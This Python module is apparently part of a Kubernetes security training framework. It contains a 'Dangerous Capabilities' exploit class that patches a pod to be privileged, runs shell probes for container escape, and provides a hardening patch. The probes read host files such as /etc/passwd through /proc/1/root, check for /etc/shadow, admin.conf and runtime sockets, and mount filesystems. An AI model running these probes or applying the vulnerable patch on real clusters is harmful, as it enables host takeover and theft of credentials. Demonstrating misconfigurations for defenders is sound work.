from typing import Dict, List

from .base import BaseExploit, ExploitResult


class DangerousCapabilitiesExploit(BaseExploit):
    """Exploit for dangerous Linux capabilities misconfiguration."""

    name = "Dangerous Capabilities"
    risk_level = "CRITICAL"
    vulnerability_type = "dangerous-capabilities"
    description = """This exploit demonstrates how containers with dangerous capabilities can:
                    - Completely escape container isolation
                    - Access host filesystem and kernel features
                    - Manipulate network configuration
                    - Load kernel modules
                    - Bypass security restrictions

                    The profile service is configured with ALL Linux capabilities (000001ffffffffff),
                    making it FULLY PRIVILEGED with complete access to the host system."""

    def get_default_service(self) -> str:
        return "unguard-profile-service"

    def get_vulnerable_patch(self) -> List[Dict]:
        return [
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext",
                "value": {},
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/privileged",
                "value": True,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/capabilities",
                "value": {
                    "add": [
                        "SYS_ADMIN",
                        "NET_ADMIN",
                        "SYS_PTRACE",
                        "DAC_OVERRIDE",
                        "DAC_READ_SEARCH",
                        "SYS_MODULE",
                    ]
                },
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/allowPrivilegeEscalation",
                "value": True,
            },
            {"op": "add", "path": "/spec/template/spec/hostPID", "value": True},
        ]

    def get_secure_patch(self) -> List[Dict]:
        return [
            {
                "op": "replace",
                "path": "/spec/template/spec/containers/0/securityContext/privileged",
                "value": False,
            },
            {
                "op": "replace",
                "path": "/spec/template/spec/containers/0/securityContext/allowPrivilegeEscalation",
                "value": False,
            },
            {
                "op": "replace",
                "path": "/spec/template/spec/containers/0/securityContext/runAsNonRoot",
                "value": True,
            },
            {
                "op": "replace",
                "path": "/spec/template/spec/containers/0/securityContext/runAsUser",
                "value": 1000,
            },
            {
                "op": "replace",
                "path": "/spec/template/spec/containers/0/securityContext/capabilities",
                "value": {"drop": ["ALL"]},
            },
            {"op": "replace", "path": "/spec/template/spec/hostPID", "value": False},
            {
                "op": "replace",
                "path": "/spec/template/spec/hostNetwork",
                "value": False,
            },
            {"op": "replace", "path": "/spec/template/spec/hostIPC", "value": False},
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/resources",
                "value": {
                    "limits": {"memory": "256Mi", "cpu": "200m"},
                    "requests": {"memory": "128Mi", "cpu": "100m"},
                },
            },
        ]

    def check_vulnerability(self) -> bool:
        """Check if service has dangerous capabilities."""
        pod_name = self.k8s.find_pod_for_service(self.service)
        if not pod_name:
            return False

        try:
            pod = self.k8s.v1.read_namespaced_pod(pod_name, self.k8s.namespace)
            container = pod.spec.containers[0]  # type: ignore[attr-defined]

            # Check for privileged
            if container.security_context and container.security_context.privileged:
                return True

            # Check for dangerous capabilities
            if (
                container.security_context
                and container.security_context.capabilities
                and container.security_context.capabilities.add
            ):
                dangerous_caps = ["SYS_ADMIN", "NET_ADMIN", "SYS_MODULE", "ALL"]
                for cap in container.security_context.capabilities.add:
                    if cap in dangerous_caps:
                        return True

            return False

        except Exception:
            return False

    def demonstrate(self) -> ExploitResult:
        """Demonstrate dangerous capabilities exploit."""
        self.logger.exploit(
            "Demonstrating privileged container escape with dangerous capabilities..."
        )

        pod_name = self.k8s.find_pod_for_service(self.service)
        if not pod_name:
            return ExploitResult(
                success=False,
                message="Pod not found for service",
            )

        evidence = []
        impact = []

        # Test 1: Verify privileged status and capabilities
        self.logger.exploit("Test 1: Verifying privileged status and capabilities")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Current user: $(id)"
                echo "[*] Hostname: $(hostname)"
                
                echo -e "\\n[*] Checking if we are privileged..."
                if [ -w /sys ]; then
                    echo "❌ VULNERABLE: Can write to /sys - privileged container!"
                    touch /sys/test_privileged 2>/dev/null && {
                        echo "[PROOF] Successfully created file in /sys"
                        rm -f /sys/test_privileged
                    } || echo "[!] /sys is read-only or protected"
                else
                    echo "✅ Protected: Cannot write to /sys"
                fi
                
                echo -e "\\n[*] Checking capabilities..."
                cap_eff=$(cat /proc/1/status | grep CapEff | awk '{print $2}')
                echo "Effective capabilities: $cap_eff"
                
                if [ "$cap_eff" = "000001ffffffffff" ]; then
                    echo "❌ VULNERABLE: Has ALL capabilities!"
                    echo "  This is the MAXIMUM capability set - complete privilege!"
                elif [ "$cap_eff" != "0000000000000000" ]; then
                    echo "❌ VULNERABLE: Has dangerous capabilities!"
                else
                    echo "✅ Protected: No dangerous capabilities"
                fi
            """,
            )

            print(result)

            if "Has ALL capabilities" in result:
                evidence.append(
                    "Container has ALL Linux capabilities (000001ffffffffff)"
                )
                evidence.append("MAXIMUM privilege level - equivalent to root on host")
            elif "Has dangerous capabilities" in result:
                evidence.append("Container has dangerous elevated capabilities")

        except Exception as e:
            self.logger.error(f"Test 1 failed: {e}")

        # Test 2: Demonstrate SYS_ADMIN capability
        self.logger.exploit("Test 2: Demonstrating SYS_ADMIN capability")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Testing mount capability (SYS_ADMIN)..."
                mkdir -p /tmp/test 2>/dev/null
                
                if mount -t tmpfs tmpfs /tmp/test 2>/dev/null; then
                    echo "❌ VULNERABLE: SYS_ADMIN capability active - can mount filesystems!"
                    echo "[PROOF] Successfully mounted tmpfs at /tmp/test"
                    mount | grep "/tmp/test"
                    umount /tmp/test 2>/dev/null
                    rmdir /tmp/test 2>/dev/null
                else
                    echo "✅ Protected: Cannot mount filesystems"
                fi
                
                echo -e "\\n[*] Testing kernel debug access..."
                if [ -d /sys/kernel/debug ]; then
                    if mount -t debugfs none /sys/kernel/debug 2>/dev/null; then
                        echo "❌ VULNERABLE: Can mount kernel debug filesystem!"
                        ls /sys/kernel/debug 2>/dev/null | head -5
                        umount /sys/kernel/debug 2>/dev/null
                    fi
                fi
            """,
            )

            print(result)

            if "SYS_ADMIN capability active" in result:
                evidence.append(
                    "SYS_ADMIN capability confirmed - can mount filesystems"
                )
                impact.append("Can mount any filesystem type including debugfs")

        except Exception as e:
            self.logger.error(f"Test 2 failed: {e}")

        # Test 3: Container escape via host filesystem
        self.logger.exploit("Test 3: Container escape via host filesystem access")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Attempting to access host filesystem..."
                
                if [ -d /proc/1/root ]; then
                    echo "❌ CRITICAL: Can access host filesystem via /proc/1/root!"
                    echo "[PROOF] Host hostname: $(cat /proc/1/root/etc/hostname 2>/dev/null || echo 'access denied')"
                    echo "[PROOF] Host users:"
                    head -3 /proc/1/root/etc/passwd 2>/dev/null || echo "  Cannot read passwd file"
                    
                    echo -e "\\n[*] Checking for sensitive host files..."
                    for file in /etc/shadow /root/.ssh/authorized_keys /etc/kubernetes/admin.conf; do
                        if [ -f "/proc/1/root$file" ]; then
                            echo "❌ CRITICAL: Can access $file on host!"
                        fi
                    done
                fi
                
                echo -e "\\n[*] Checking device access..."
                if [ -e /dev/mem ]; then
                    echo "❌ CRITICAL: Can access /dev/mem (physical memory)!"
                fi
                if [ -e /dev/kmsg ]; then
                    echo "❌ VULNERABLE: Can access /dev/kmsg (kernel messages)!"
                fi
            """,
            )

            print(result)

            if "Can access host filesystem" in result:
                evidence.append("Direct access to host filesystem confirmed")
                impact.append("Can read ANY file on the host including /etc/shadow")
            if "access denied" in result:
                evidence.append(
                    "Access to host filesystem is denied, but container may still attempt escape"
                )

        except Exception as e:
            self.logger.error(f"Test 3 failed: {e}")

        # Test 4: Network and process manipulation
        self.logger.exploit("Test 4: Network and process manipulation")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Testing NET_ADMIN capability..."
                
                if ip link add dummy0 type dummy 2>/dev/null; then
                    echo "❌ VULNERABLE: NET_ADMIN capability active!"
                    echo "[PROOF] Created network interface: dummy0"
                    ip link show dummy0 2>/dev/null | head -2
                    ip link delete dummy0 2>/dev/null
                else
                    echo "✅ Protected: Cannot create network interfaces"
                fi
                
                echo -e "\\n[*] Testing SYS_PTRACE capability..."
                if [ -r /proc/1/environ ]; then
                    echo "❌ VULNERABLE: Can read other process environments!"
                    echo "[PROOF] Init process environment accessible"
                fi
                
                echo -e "\\n[*] Checking for container runtime sockets..."
                for sock in /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock; do
                    if [ -S "$sock" ] || [ -S "/proc/1/root$sock" ]; then
                        echo "❌ CRITICAL: Found $sock - can control all containers!"
                    fi
                done
            """,
            )

            print(result)

            if "NET_ADMIN capability active" in result:
                evidence.append("NET_ADMIN capability allows network manipulation")
                impact.append("Can create/modify network interfaces and routes")

        except Exception as e:
            self.logger.error(f"Test 4 failed: {e}")

        # Summary
        self.logger.exploit("=== Impact Summary ===")
        summary_impact = [
            "Completely escape the container",
            "Access ANY file on the host",
            "Read host memory and kernel data",
            "Control all other containers on the node",
            "Load kernel modules (rootkits)",
            "Persist on the host system",
            "Pivot to the entire cluster",
        ]

        for item in summary_impact:
            print(f"  • {item}")

        return ExploitResult(
            success=bool(evidence),
            message="Dangerous capabilities exploit demonstrated",
            evidence=evidence,
            impact=impact + summary_impact,
        )
